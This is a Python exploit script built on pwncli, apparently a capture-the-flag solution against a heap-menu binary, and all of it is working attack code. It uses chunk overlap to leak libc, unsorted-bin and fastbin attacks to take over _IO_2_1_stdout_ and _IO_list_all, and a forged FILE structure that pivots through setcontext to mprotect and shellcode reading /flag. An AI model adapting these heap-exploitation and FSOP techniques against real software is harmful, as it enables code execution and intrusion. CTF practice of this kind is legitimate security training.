#!/usr/bin/python3
from pwncli import *

cli_script()

p:tube = gift['io']
elf:ELF = gift['elf']
libc: ELF = gift['libc']

def add(size:int):
    p.sendlineafter("Choice: \n", "1")
    p.sendlineafter("Size: ", str(size))


def edit(idx:int, data:(str, bytes)):
    p.sendlineafter("Choice: \n", "2")
    p.sendlineafter("Index: ", str(idx))
    p.sendafter("Content: ", data)


def delete(idx:int):
    p.sendlineafter("Choice: \n", "3")
    p.sendlineafter("Index: ", str(idx))


def show(idx:int):
    p.sendlineafter("Choice: \n", "4")
    p.sendlineafter("Index: ", str(idx))
    return p.recvline()


add(0x80) # 0
add(0x68) # 1
add(0xf0) # 2
add(0x800) # 3


delete(0)
edit(1, flat(["a" * 0x60, 0x100]))

delete(2)

add(0x80)
msg = show(1)
libc_base_addr = u64(msg[:-1].ljust(8, b"\x00")) - 0x3c4b78
libc.address = libc_base_addr

log_address("libc_base_addr", libc_base_addr)
stop()
delete(0)

add(0xf0)
add(0xf0)

delete(0)
add(0x80)

edit(1, flat([0, libc_base_addr + 0x3c67f8 - 0x10]))

add(0x60)

delete(1)

edit(4, p64(libc.sym["_IO_2_1_stdout_"] - 0x43))

add(0x60)

add(0x68) # 5

edit(5, flat("\x00" * 0x33, 0xfbad1887, 0, 0, 0, libc.sym['__curbrk'] - 8, libc.sym['__curbrk'] + 8))

msg = p.recvn(16)
heap_base_addr = u64(msg[8:]) - 0x21000
log_address("heap_base_addr", heap_base_addr)
stop()
delete(1)
edit(4, p64(libc.sym["_IO_list_all"] - 0x23))

add(0x60)
add(0x60)
edit(6, flat(["\x00" * 0x13, heap_base_addr+0x210]))

delete(3)
add(0x800) # 3
stop()
payload = flat({
    0x18:libc.sym['setcontext']+0x35,
    0x28:1,
    0xd8:heap_base_addr+0x210,
    0xa0:heap_base_addr+0x210+0x100,
    0xa8:libc.sym['mprotect'],
    0x100: heap_base_addr+0x180+0x210,
    0x68: heap_base_addr,
    0x70: 0x3000,
    0x88: 7,
    0x180:asm(shellcraft.cat("/flag"))
}, filler="\x00")

edit(3, payload)
stop()
p.sendlineafter("Choice: \n", "5")


p.interactive()